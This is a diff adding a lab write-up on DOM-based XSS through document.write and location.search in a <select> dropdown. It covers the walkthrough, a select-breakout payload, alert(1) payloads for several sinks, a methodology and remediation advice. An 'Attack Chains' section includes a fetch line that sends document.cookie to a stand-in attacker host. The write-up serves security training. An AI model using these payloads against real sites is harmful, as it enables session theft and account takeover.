@@ -1336,3 +1336,459 @@ Stored XSS
 
 DOM XSS  
 → JavaScript processes input inside the browser
+
+---
+
+# Lab-4 🐞 DOM-Based XSS via document.write + location.search in <select> — Enhanced Write-Up
+
+---
+
+## 🔹 Overview
+
+DOM-Based Cross-Site Scripting (DOM XSS) occurs when:
+
+- User-controlled input is processed entirely in the browser  
+- JavaScript reads this input from sources like the URL  
+- The input is written into the DOM using unsafe sinks  
+
+In this lab:
+
+- Server response is **safe** ❌  
+- Payload is **not stored** ❌  
+- Execution happens in **client-side JavaScript** ✅  
+
+Key idea:
+
+→ **The browser becomes the vulnerable component, not the server**
+
+---
+
+## 🔹 What Is This Topic?
+
+DOM XSS follows this flow:
+
+User input  
+→ JavaScript reads input  
+→ Unsafe DOM insertion  
+→ Execution  
+
+Critical concept:
+
+**If attacker-controlled data reaches a dangerous sink without sanitization, execution is possible.**
+
+Unlike other XSS types:
+
+- No server reflection  
+- No database storage  
+- Entire attack lives in the browser runtime  
+
+---
+
+## 🔹 Lab Walkthrough
+
+### Step 1 — Open Lab
+
+Application:
+
+- Stock checker  
+- Dropdown (<select>) for store selection  
+- Locations: London, Paris, Milan  
+
+---
+
+### Step 2 — Observe Normal Behavior
+
+- Selecting a store updates stock dynamically  
+- No visible user input in URL  
+
+→ Looks safe at first glance  
+
+---
+
+### Step 3 — Investigate JavaScript
+
+Using DevTools:
+
+Search for:
+
+location.search  
+
+Discovery:
+
+- Application reads parameter: **storeId**  
+
+---
+
+### Step 4 — Inject Parameter Manually
+
+Append to URL:
+
+?storeId=London  
+
+Result:
+
+- Application works normally  
+
+→ Confirms JavaScript is processing user input  
+
+---
+
+### Step 5 — Test Reflection in DOM
+
+Inject:
+
+XSS123  
+
+Inspect **live DOM** (NOT View Source):
+
+<option selected>XSS123</option>  
+
+→ Input is inserted dynamically  
+
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+### Screenshot-01
+![DOM reflection in option](../images/dom-xss-input-reflection.png)
+
+### Screenshot-02
+![DOM exploitation in option](../images/dom-xss-input-exploitation.png)
+
+---
+
+### Step 6 — Identify Context
+
+Injection point:
+```
+<option selected>INPUT</option>  
+```
+Context:
+
+- Inside `<option>`  
+- Nested in `<select>`  
+
+---
+
+### ⚠ Critical Observation
+
+`<select>` is a **restricted HTML context**
+
+- `<script>` tags → blocked  
+- Many elements → ignored  
+- Events → limited  
+
+→ Standard payloads FAIL  
+
+---
+
+### Step 7 — Craft Payload
+
+Goal:
+
+→ Break out of `<select>`  
+→ Inject executable element  
+
+Payload:
+```
+"></select><img%20src=1%20onerror=alert(1)>  
+```
+Decoded:
+```
+"></select><img src=1 onerror=alert(1)>  
+```
+---
+
+### Step 8 — Understand DOM Transformation
+
+Before:
+```
+<option selected>London</option>  
+```
+After injection:
+```
+<option selected>"></option>  
+</select>  
+<img src=1 onerror=alert(1)>  
+```
+---
+
+### Step 9 — Execution
+
+- Image fails to load  
+- `onerror` triggers  
+- JavaScript executes  
+
+→ Alert appears  
+→ Lab solved  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Dropdown / Select Injection
+
+Pattern:
+
+document.write('<option>'+userInput+'</option>')  
+
+Payload:
+```
+"></select><svg onload=alert(1)>  
+```
+Why it works:
+
+→ Escape restricted tag  
+→ Inject new executable context  
+
+---
+
+### 🟢 document.write Abuse
+
+Pattern:
+
+document.write(userInput)  
+
+Payload:
+```
+<script>alert(1)</script>  
+```
+Why:
+
+→ Direct HTML parsing → immediate execution  
+
+---
+
+### 🟢 innerHTML Injection
+
+Pattern:
+
+element.innerHTML = userInput  
+
+Payload:
+```
+<img src=x onerror=alert(1)>  
+```
+Common in:
+
+- Dashboards  
+- Search features  
+- Dynamic UI  
+
+---
+
+### 🟢 JavaScript Execution Sinks
+
+Examples:
+
+eval(userInput)  
+setTimeout(userInput)  
+Function(userInput)  
+
+Payload:
+```
+alert(1)  
+```
+Impact:
+
+→ Direct JS execution  
+
+---
+
+### 🟢 URL Fragment DOM XSS
+
+Source:
+
+location.hash  
+
+Payload:
+```
+#<img src=x onerror=alert(1)>  
+```
+Common in:
+
+- SPAs  
+- Client routing  
+
+---
+
+### 🟢 Hidden Parameter Processing
+
+Pattern:
+
+JavaScript reads unseen parameters  
+
+Payload:
+
+?param=<payload>  
+
+→ Not visible in UI but still exploitable  
+
+---
+
+## 🎯 High-Value Targets
+
+- Dropdowns / selects  
+- Filters  
+- Search features  
+- Client-side routing  
+- Analytics scripts  
+- Admin panels  
+- Hidden JS parameters  
+- Preview / live render features  
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Session Hijacking
+
+Payload:
+
+fetch("https://attacker.com?c="+document.cookie)  
+
+Impact:
+
+→ Steal session cookies  
+
+---
+
+### 🔥 Account Takeover
+
+Steal:
+
+- Cookies  
+- JWT tokens  
+- CSRF tokens  
+
+→ Impersonate victim  
+
+---
+
+### 🔥 Admin Compromise
+
+Flow:
+
+- Send malicious URL  
+- Admin loads page  
+- Payload executes  
+
+→ Full system control  
+
+---
+
+### 🔥 Data Exfiltration
+
+Extract:
+
+- DOM data  
+- API responses  
+- Sensitive user info  
+
+---
+
+### 🔥 CSRF Bypass
+
+Use JS to:
+
+→ Perform authenticated actions automatically  
+
+---
+
+## 🧪 Methodology
+
+---
+
+### Step 1 — Identify Sources
+
+- location.search  
+- location.hash  
+- document.cookie  
+- document.referrer  
+
+---
+
+### Step 2 — Inject Marker
+
+XSS123TEST  
+
+---
+
+### Step 3 — Inspect Live DOM
+
+Use DevTools  
+
+→ NOT view-source  
+
+---
+
+### Step 4 — Identify Sinks
+
+- document.write  
+- innerHTML  
+- eval  
+
+---
+
+### Step 5 — Identify Context
+
+- HTML  
+- Attribute  
+- Restricted tag  
+
+---
+
+### Step 6 — Craft Payload
+
+Break structure  
+→ Escape context  
+→ Inject executable code  
+
+---
+
+## 🛡 Remediation
+
+- Avoid document.write()  
+- Avoid innerHTML with untrusted input  
+- Use textContent  
+- Sanitize inputs  
+- Use secure frameworks  
+- Implement CSP  
+
+---
+
+## 💡 Notes / Mindset
+
+Key realization:
+
+→ **Execution happens AFTER DOM modification**
+
+Important:
+
+- Server can be secure  
+- Frontend can still be vulnerable  
+
+Always ask:
+
+→ Where does input enter JS?  
+→ Where is it written?  
+→ What context is it in?  
+→ Can I break out?  
+
+---
+
+## 🧠 Mental Model
+
+Input  
+→ JavaScript source  
+→ DOM sink  
+→ Context  
+→ Break structure  
+→ Execute  
+→ Impact  
+
+---
